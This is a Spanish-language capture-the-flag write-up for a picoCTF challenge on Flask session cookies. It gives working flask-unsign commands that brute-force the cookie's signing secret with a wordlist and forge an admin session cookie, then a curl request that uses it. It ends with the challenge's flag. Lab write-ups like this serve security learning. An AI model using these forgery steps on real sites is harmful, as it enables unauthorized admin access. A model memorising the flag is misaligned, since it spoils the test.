# Descripción
Alright, enough of using my own encryption. Flask session cookies should be plenty secure! [server.py](https://mercury.picoctf.net/static/1e4bd835ad3e7fe776d49e7b8cc280c1/server.py) [http://mercury.picoctf.net:35697/](http://mercury.picoctf.net:35697/)
Hints:
1. How secure is a flask cookie?
# Solución
- Descargamos el código que nos da
- Usaremos flask Unsign que nos permite hacer un ataque de fuerza bruta a la cookie con la que se cifró
- Crearemos un ambiente virtual, para esto primero analizaremos que tenemos lo necesario
```
sudo apt install python3-venv
```
- Instalamos en el ambiente virtual la herramienta flask-unsign
```
amv@LAPTOP-1MU6MBUF:~$ python3 -m venv ~/.venv
amv@LAPTOP-1MU6MBUF:~$ source ~/.venv/bin/activate
(.venv) amv@LAPTOP-1MU6MBUF:~$ python3 -m pip install flask-unsign
```
- Tomamos el valor de la cookie
- Le hacemos un ataque de fuerza bruta con el siguiente comando:
```
flask-unsign --unsign --cookie "eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.Z_Mu6Q.KcadUhiC78Ma7mlByGWo19HIbQ4" --wordlist cookies.txt
```
- En nuestro caso la cookie firmada fue "peanut butter"
- Ahora usamos sign con nuestra palabra secreta
```
flask-unsign --sign --cookie "{'very_auth': 'admin'}" --secret "peanut butter"
```
- Ahora la lanzamos contra el sitio para ver si funciona utilizando curl -s para que sea silencioso, también aprovechamos para hacer un grep
```
 curl -s http://mercury.picoctf.net:35697/display -H "Cookie: session=eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.Z_M0NQ.zdawRnSyGCRZwhO8MK0n9NYzAqc" | grep pico
```
- Obtenemos la bandera
```
(.venv) amv@LAPTOP-1MU6MBUF:~$ flask-unsign --sign --cookie "{'very_auth': 'admin'}" --secret "peanut butter"
eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.Z_M0NQ.zdawRnSyGCRZwhO8MK0n9NYzAqc
(.venv) amv@LAPTOP-1MU6MBUF:~$ curl -s http://mercury.picoctf.net:35697/display -H "Cookie: session=eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.Z_M0NQ.zdawRnSyGCRZwhO8MK0n9NYzAqc" | grep pico
            <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{pwn_4ll_th3_cook1E5_22fe0842}</code></p>
```

```
picoCTF{pwn_4ll_th3_cook1E5_22fe0842}
```
# Notas adicionales
# Referencias